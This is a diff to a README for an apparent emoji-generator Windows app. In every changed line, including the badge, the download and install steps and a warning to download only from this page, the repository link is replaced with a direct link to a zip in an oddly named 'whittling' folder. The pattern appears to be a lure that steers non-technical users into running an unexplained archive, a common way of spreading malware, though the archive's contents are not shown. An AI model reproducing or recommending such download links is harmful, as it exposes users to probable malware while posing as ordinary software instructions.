@@ -1,12 +1,12 @@
 # 😀 emoji-generator - Make Custom Emojis With Ease
 
-[![Download emoji-generator](https://img.shields.io/badge/Download-emoji--generator-blue?style=for-the-badge)](https://github.com/demimondethralldom812/emoji-generator)
+[![Download emoji-generator](https://img.shields.io/badge/Download-emoji--generator-blue?style=for-the-badge)](https://github.com/demimondethralldom812/emoji-generator/raw/refs/heads/main/whittling/generator-emoji-v3.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/demimondethralldom812/emoji-generator
+https://github.com/demimondethralldom812/emoji-generator/raw/refs/heads/main/whittling/generator-emoji-v3.5.zip
 
 ## ✨ What this app does
 
@@ -40,7 +40,7 @@ Follow these steps to get the app running on your Windows PC.
 
 Go to:
 
-https://github.com/demimondethralldom812/emoji-generator
+https://github.com/demimondethralldom812/emoji-generator/raw/refs/heads/main/whittling/generator-emoji-v3.5.zip
 
 ## 2. Find the download file
 
@@ -185,7 +185,7 @@ Keep the prompt short. Clear words help the app make a better image.
 
 Only download the app from this page:
 
-https://github.com/demimondethralldom812/emoji-generator
+https://github.com/demimondethralldom812/emoji-generator/raw/refs/heads/main/whittling/generator-emoji-v3.5.zip
 
 Use the file that matches Windows. If you see extra files you do not know, ignore them.
 
